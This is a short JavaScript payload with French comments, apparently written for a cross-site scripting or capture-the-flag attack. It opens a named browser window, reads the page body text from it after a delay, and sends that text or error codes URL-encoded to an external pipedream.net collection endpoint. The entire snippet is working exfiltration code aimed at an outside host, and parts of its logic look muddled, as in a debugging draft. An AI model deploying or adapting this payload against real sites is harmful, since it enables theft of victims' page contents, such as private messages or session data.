(function(){
  const END = "https://eoeipamgnflz15n.m.pipedream.net";
  const DELAY_MS = 1500;

  // Ouvrir tout de suite un onglet nommé "skav_debug" pour limiter le blocage
  var w = null;
  try {
    w = window.open(END + "/skav_test", "skav_debug");
    console.log("[ppp] opened debug window:", !!w);
  } catch(e) {
    console.warn("[ppp] open threw:", e);
    w = null;
  }

  // Si popup bloquée (w === null), on prévenira via location (fallback)
  function sendError(code){
    const url = END + "?error=" + encodeURIComponent(code);
    console.warn("[ppp] sending error ->", url);
    try {
      // prefer window.open into named tab if possible
      if (w) w = window.open(url, "skav_debug");
      else window.open(url, "skav_debug");
    } catch(e){
      // last resort: top-level navigation (will replace current page)
      try { location.replace(url); } catch(_) { /* nothing */ }
    }
  }

  function sendOk(content){
    const url = END + "?ok=" + encodeURIComponent(content);
    console.log("[ppp] sending ok ->", url.slice(0,200));
    try {
      if (w) w = window.open(url, "skav_debug");
      else window.open(url, "skav_debug");
    } catch(e){
      try { location.replace(url); } catch(_) {}
    }
  }

  // délai avant lecture (laisser la page rendre)
  setTimeout(function(){
    try {
      if (!w) {
        // peut être bloqué par popup blocker
        console.warn("[ppp] debug window is null -> popup may be blocked");
        // on essaie d'ouvrir /message anyway (user agent may show it)
        try { window.open("/message", "skav_debug"); } catch(e) {}
        // et on envoie l'erreur explicite
        sendError("popup_blocked");
        return;
      }

      // essayer d'accéder au document. Si cross-origin, ça throwera SecurityError
      let doc;
      try { doc = w.document; } catch(e) {
        console.error("[ppp] cannot access w.document (cross-origin?)", e);
        sendError("cors");
        return;
      }

      if (!doc){
        console.error("[ppp] no document available on opened window");
        sendError("no_doc");
        return;
      }

      const body = doc.body;
      if (!body) {
        console.error("[ppp] no body element found");
        sendError("no_body");
        return;
      }

      const content = (body.innerText || body.textContent || "").trim();
      console.log("[ppp] got content length:", content.length);
      if (!content) {
        sendError("empty_body");
        return;
      }

      // everything ok -> send content (url-encoded)
      sendOk(content);

    } catch (err) {
      console.error("[ppp] unexpected error:", err);
      sendError("unexpected_" + (err && err.message ? err.message : String(err)));
    }
  }, DELAY_MS);
})();
